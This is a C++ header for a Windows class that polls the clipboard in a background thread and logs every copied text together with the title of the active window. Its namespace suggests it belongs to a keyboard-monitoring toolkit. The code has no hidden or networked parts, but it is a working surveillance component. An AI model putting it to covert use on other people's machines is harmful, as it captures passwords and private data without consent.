#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <functional>
#include <chrono>

namespace nuub::infrastructure::keyboard {

// Monitors clipboard changes and logs content
class ClipboardMonitor {
    std::atomic<bool> running_{false};
    std::thread monitor_thread_;
    std::mutex mutex_;
    std::vector<std::pair<std::string, std::string>> clipboard_log_; // {window_title, content}
    std::function<void(const std::string&, const std::string&)> on_change_;
    UINT last_sequence_ = 0;
    int check_interval_ms_ = 1000;

    // Get the foreground window title
    static std::string get_foreground_window() {
        HWND hwnd = GetForegroundWindow();
        if (!hwnd) return "";

        wchar_t title[256]{};
        int len = GetWindowTextW(hwnd, title, 256);
        if (len == 0) return "";

        // Convert to narrow string
        std::string result;
        result.reserve(len);
        for (int i = 0; i < len; ++i) {
            result += static_cast<char>(title[i]);
        }
        return result;
    }

    // Read clipboard text content
    static std::string read_clipboard_text() {
        if (!IsClipboardFormatAvailable(CF_TEXT) &&
            !IsClipboardFormatAvailable(CF_UNICODETEXT)) {
            return "";
        }

        if (!OpenClipboard(nullptr)) return "";

        std::string result;

        // Try Unicode first
        if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                auto* wstr = static_cast<const wchar_t*>(GlobalLock(hData));
                if (wstr) {
                    // Convert to narrow string
                    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
                    if (len > 0) {
                        result.resize(len - 1);
                        WideCharToMultiByte(CP_UTF8, 0, wstr, -1, result.data(), len, nullptr, nullptr);
                    }
                    GlobalUnlock(hData);
                }
            }
        } else if (IsClipboardFormatAvailable(CF_TEXT)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                auto* str = static_cast<const char*>(GlobalLock(hData));
                if (str) {
                    result = str;
                    GlobalUnlock(hData);
                }
            }
        }

        CloseClipboard();
        return result;
    }

    void monitor_loop() {
        while (running_) {
            UINT current_sequence = GetClipboardSequenceNumber();

            if (current_sequence != last_sequence_ && last_sequence_ != 0) {
                // Clipboard changed
                std::string content = read_clipboard_text();
                if (!content.empty()) {
                    // Truncate very long content
                    if (content.size() > 4000) {
                        content.resize(4000);
                        content += "... [truncated]";
                    }

                    std::string window = get_foreground_window();

                    {
                        std::lock_guard lock(mutex_);
                        clipboard_log_.emplace_back(window, content);
                    }

                    if (on_change_) {
                        on_change_(window, content);
                    }
                }
            }

            last_sequence_ = current_sequence;
            std::this_thread::sleep_for(std::chrono::milliseconds(check_interval_ms_));
        }
    }

public:
    ClipboardMonitor() = default;

    ~ClipboardMonitor() {
        stop();
    }

    void set_on_change(std::function<void(const std::string&, const std::string&)> callback) {
        on_change_ = std::move(callback);
    }

    void set_check_interval(int ms) {
        check_interval_ms_ = ms;
    }

    void start() {
        if (running_) return;
        running_ = true;
        last_sequence_ = GetClipboardSequenceNumber();
        monitor_thread_ = std::thread(&ClipboardMonitor::monitor_loop, this);
    }

    void stop() {
        running_ = false;
        if (monitor_thread_.joinable()) {
            monitor_thread_.join();
        }
    }

    // Get clipboard log
    std::vector<std::pair<std::string, std::string>> get_log() {
        std::lock_guard lock(mutex_);
        return clipboard_log_;
    }

    // Get clipboard log as formatted string
    std::string get_log_text() {
        std::lock_guard lock(mutex_);
        std::string result;
        for (const auto& [window, content] : clipboard_log_) {
            result += "[" + window + "] " + content + "\n";
        }
        return result;
    }

    // Clear log
    void clear_log() {
        std::lock_guard lock(mutex_);
        clipboard_log_.clear();
    }

    bool is_running() const { return running_; }
};

} // namespace nuub::infrastructure::keyboard
#endif
